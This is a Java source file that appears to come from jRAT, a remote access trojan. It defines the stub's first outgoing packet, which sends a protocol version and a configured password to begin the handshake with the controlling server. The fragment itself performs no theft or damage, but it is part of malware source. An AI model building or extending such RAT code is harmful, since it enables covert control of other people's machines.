package io.jrat.stub.packets.outgoing;

import io.jrat.common.Version;
import io.jrat.common.codec.Hex;
import io.jrat.common.io.StringWriter;
import io.jrat.stub.Configuration;

import java.io.DataOutputStream;

public class Packet1InitHandshake extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {		
		String data = Configuration.getPass();

		dos.writeFloat(Version.getProtocolVersion());
		dos.write(Hex.decodeToBytes(data));
	}

	@Override
	public byte getPacketId() {
		return (byte) 1;
	}

}
